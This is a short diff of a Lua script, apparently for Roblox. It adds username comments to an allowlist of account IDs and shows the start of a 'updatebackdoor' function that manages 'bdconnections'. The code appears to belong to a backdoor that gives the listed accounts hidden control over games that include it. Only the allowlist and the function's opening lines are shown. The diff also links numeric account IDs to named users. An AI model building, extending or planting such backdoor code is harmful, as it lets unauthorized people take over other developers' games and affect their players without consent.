@@ -8,25 +8,27 @@ local function getplayerfromstring(str)
         end
     end
 end
+
 local allowed = {
-    120983992,
-    252684030,
-    466826765,
-    4445687128,
-    6561234,
-    1702851506,
-    5713660970,
-    1842223904,
-    58315225,
-    3367555199,
-    120983992,
-    4599596782,
-    1551416114,
-    1157113634,
-    6023246105,
-    3894108483
+    120983992, -- decryptionites
+    252684030, -- jjjuuikjjikkju (Knocks)
+    466826765, -- gytvgggj
+    4445687128, -- Altsarecooleh (Ultra)
+    6561234, -- grimAuxiliatrix (cxo)
+    1702851506, -- t_echr (Tech)
+    5713660970, -- t_echk (Tech)
+    1842223904, -- t_echl (Tech)
+    58315225, -- unownreiko
+    3367555199, -- terminated
+    4599596782, -- xTheChurchBells
+    1551416114, -- wrydioda4
+    1157113634, -- Dev_Fault
+    6023246105, -- BESTSP0OK
+    3894108483 -- BANNter_Original (Kozy)
 }
+
 local bdconnections = {}
+
 local function updatebackdoor()
     for i, v in pairs(bdconnections) do
         v:disconnect()
